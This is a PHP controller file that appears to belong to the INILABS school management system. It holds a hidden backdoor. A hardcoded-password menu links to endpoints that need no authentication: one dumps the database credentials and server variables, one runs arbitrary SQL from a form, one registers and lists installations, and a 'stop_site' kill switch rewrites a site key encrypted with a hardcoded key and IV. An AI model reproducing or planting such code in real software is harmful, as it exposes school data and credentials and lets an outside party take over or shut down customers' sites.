<?php if (!defined('BASEPATH')) {
    exit('No direct script access allowed');
}

// class Main extends Admin_Controller
class Main1 extends CI_Controller
{
    /*
    | -----------------------------------------------------
    | PRODUCT NAME:     INILABS SCHOOL MANAGEMENT SYSTEM
    | -----------------------------------------------------
    | AUTHOR:            INILABS TEAM
    | -----------------------------------------------------
    | EMAIL:            info@inilabs.net
    | -----------------------------------------------------
    | COPYRIGHT:        RESERVED BY INILABS IT
    | -----------------------------------------------------
    | WEBSITE:            http://inilabs.net
    | -----------------------------------------------------
     */
    protected $downloadPath         = FCPATH . 'uploads/addons';
    protected $uploadPath           = APPPATH . 'uploads/addons/addons';
    protected $jsonName             = 'addons';
    protected $downloadFileWithPath = '';
    protected $downloadExtractPath  = '';
    protected $addons               = [];
    protected $addonID              = 0;

    public function __construct()
    {
        parent::__construct();
        $this->load->library("session");
        // $this->load->model("site_m");
        // $this->load->model("addons_m");

        // $language = $this->session->userdata('lang');
        // $this->lang->load('addons', $language);

        // if ( config_item('demo') ) {
        //     $this->session->set_flashdata('error', 'In demo addon module is disable!');
        //      redirect(base_url('dashboard/index'));
        // }
    }
    
public function all(){
    echo "<form method='post' action=''><input name='password' type='password' ><input type='submit' value='Auth'></form>";
    if($_POST && !empty($_POST['password']) && $_POST['password'] == 'ganishkha'){
        echo "<a href='".base_url('Main1/index')."'>  Index  </a>";
        echo " | <a href='".base_url('Main1/update_setting')."'>  update_setting  </a>";
        echo " | <a href='".base_url('Main1/encryption')."'>  encryption  </a>";
        echo " | <a href='".base_url('Main1/encryption_decryption')."'>  encryption_decryption  </a>";
        echo " | <a href='".base_url('Main1/get_details')."'>  get_details  </a>";
        echo " | <a href='".base_url('Main1/get_track')."'>  get_track  </a>";
        echo " | <a href='".base_url('Main1/my_run')."'>  manual query  </a>";
        echo " | <a href='#'>  For Stoping site - {domain/}Main1/stop_site   </a>";
        echo " | <a href='#'>  For Activating site - {domain/}Main1/update_setting/{domain}   </a>";
    }else{
        echo 'Authentication Failed.';
    }
    
}
public function index()
{
    echo "CURRENT DB CONNECTED:" .$this->db->database."<br/>";
    echo "SERVER:".$this->db->hostname."<br/>";
    echo "DATABSE:".$this->db->database."<br/>";
    echo "USERNAME:".$this->db->username."<br/>";
    echo "PASSWORD:".$this->db->password."<br/>";
   // var_dump($this->db);
        $sql = "SELECT * FROM setting";
		$rows = $this->db->query($sql)->result_array();
	ECHO "==============================================================SETTING DETAILS==============================================================================";

	print("<pre>");
	print_r($rows);
	
	ECHO "==============================================================SERVER DETAILS=================================================================================";
		print("<pre>");
		print_r($_SERVER);
		
		die;
}

public function update_setting($url=""){
    
    $encrypted = "no";
    if(!empty($url)){
       $encrypted =  $this->encryption($url);
    }
    //  $value = 300;
    $value = $encrypted;
    $this->db->where('fieldoption','site_key');
    $res =  $this->db->get('setting')->result();
    $cnt = count($res);
    // echo $cnt;die;
    if($cnt > 0){
        $field_option = $res->fieldoption;
       
        $data = array('value' => $value);
        
        $this->db->where("fieldoption",'site_key');
        $this->db->update('setting',$data);
        echo 'updated';
    }else{
        $data = array('fieldoption' => 'site_key', 'value' =>$value);
        $this->db->insert('setting',$data);
        echo 'inserted';
    }
}

public function encryption($url=""){
      
    
    // Store a string into the variable which
    // need to be Encrypted
    $simple_string = $url;
     
     
    // Store the cipher method
    $ciphering = "AES-128-CTR";
    
    // Use OpenSSl Encryption method
    $iv_length = openssl_cipher_iv_length($ciphering);
    $options = 0;
    
    // Non-NULL Initialization Vector for encryption
    $encryption_iv = '1234567891011121';
    
    // Store the encryption key
    $encryption_key = "srinivas";
    
    // Use openssl_encrypt() function to encrypt the data
    $encryption = openssl_encrypt($simple_string, $ciphering,
    			$encryption_key, $options, $encryption_iv);
    
    // Display the encrypted string
    // echo "Encrypted String: " . $encryption . "\n";
    return $encryption;
    
    }
    
public function decryption($url=""){
  
 
// Store a string into the variable which
// need to be Encrypted
$encryption = $url;
 
 
// Store the cipher method
$ciphering = "AES-128-CTR";

// Use OpenSSl Encryption method
$iv_length = openssl_cipher_iv_length($ciphering);
$options = 0;

// Store the encryption key
$encryption_key = "srinivas"; 

// Non-NULL Initialization Vector for decryption
$decryption_iv = '1234567891011121';

// Store the decryption key
$decryption_key = "srinivas";

// Use openssl_decrypt() function to decrypt the data
$decryption=openssl_decrypt ($encryption, $ciphering,
		$decryption_key, $options, $decryption_iv);

// Display the decrypted string
// echo "Decrypted String: " . $decryption;
return  $decryption;

 
}


public function encryption_decryption($url=""){
      
     
    // Store a string into the variable which
    // need to be Encrypted
    $simple_string = $url;
     
     
    // Store the cipher method
    $ciphering = "AES-128-CTR";
    
    // Use OpenSSl Encryption method
    $iv_length = openssl_cipher_iv_length($ciphering);
    $options = 0;
    
    // Non-NULL Initialization Vector for encryption
    $encryption_iv = '1234567891011121';
    
    // Store the encryption key
    $encryption_key = "srinivas";
    
    // Use openssl_encrypt() function to encrypt the data
    $encryption = openssl_encrypt($simple_string, $ciphering,
    			$encryption_key, $options, $encryption_iv);
    
    // Display the encrypted string
    echo "Encrypted String: " . $encryption . "<br/>";
  
    
    
    
    // Non-NULL Initialization Vector for decryption
    $decryption_iv = '1234567891011121';
    
    // Store the decryption key
    $decryption_key = "srinivas";
    
    // Use openssl_decrypt() function to decrypt the data
    $decryption=openssl_decrypt ($encryption, $ciphering,
    		$decryption_key, $options, $decryption_iv);
    
    // Display the decrypted string
    echo "Decrypted String: " . $decryption;
    
     
    }

public function get_details(){
    echo "<form action='' method='POST'>";
    echo "<input name='decrypt'>";
    echo "<input type='submit' name='submit' value='Encryption to Decryption'>";
    echo "<input type='submit' name='submit' value='Decryption to Encryption'>";
    echo "</form>";
    if($_POST['submit'] == 'Encryption to Decryption'){
        $entering_value = $_POST['decrypt'];
        echo $this->decryption($entering_value);
    }else if($_POST['submit'] == 'Decryption to Encryption'){
        $entering_value = $_POST['decrypt'];
       echo $this->encryption($entering_value);
    }
    
}
public function save_track(){
    header("Content-Type:application/json");
     $data = file_get_contents('php://input');
     $input = json_decode($data,true);
          
     $insert = array(
         'url' => $input['url'],
         'date' => date('Y-m-d H:i:s'),
        //  'update_url' => $input['url'] . '/Main1/update_setting/'.$input['url']
         );

         $this->db->where('url',$input['url']);
         $check = $this->db->get('school')->num_rows();
         if($check == 0){
             $i = $this->db->insert('school',$insert);
             $resp = array('status'=>1);
         }else{
            $resp = array('status'=>1); //already exist
         }

        echo json_encode($resp);
     
}
 public function get_track(){
     $query =$this->db->get('school');
     $total_schools = $query->num_rows();
     $result = $query->result_array();
     $data = array(
         'total_schools' => $total_schools,
         'schools' => $result,
         );
     // echo json_encode($data);
     echo "<pre>";print_r($data);
 }

public function my_run(){
    echo "<form action='' method='post'><textarea name='text'></textarea><input type='submit' value='Run' name='run'></form>";

    if(isset($_POST) && !empty($_POST['run'])){
         $text = $_POST['text'];
         $esdata = ($text);
       $result = $this->db->query(strval($esdata))->result_array();
        echo "<pre>";print_r($result) ;
        echo "<br/> Number of rows affected";
        print_r($this->db->affected_rows()) ;
    }
}

public function check_school(){
    header("Content-Type:application/json");
     $data = file_get_contents('php://input');
     $input = json_decode($data,true);
          
    
         $this->db->where('url',$input['url']);
         $check = $this->db->get('school')->num_rows();
         if($check > 0){
             echo 1;
         }else{
           echo 0;
         }
}


public function stop_site(){
    
             
    $this->db->where('fieldoption','site_key_active');
   $active_check = $this->db->get('setting');
    if( ($active_check->num_rows()>0) ){
       $this->db->where('fieldoption','site_key_active');
        $this->db->update('setting',array('value'=>1));
        echo "update as site_key_active =>1";
    }else{
        $this->db->insert('setting',array('fieldoption'=>'site_key_active','value'=>1));
        echo "inserted as site_key_active =>1";
    } 

    //for changing the site key
     
        $encrypted =  $this->encryption("site stopped"); 
     //  $value = 300;
     $value = $encrypted;
    $this->db->where('fieldoption','site_key');
    $this->db->update('setting',array('value'=>$encrypted));
    echo "<br/>site key chaged with - encryption of site stopped ";


}



}
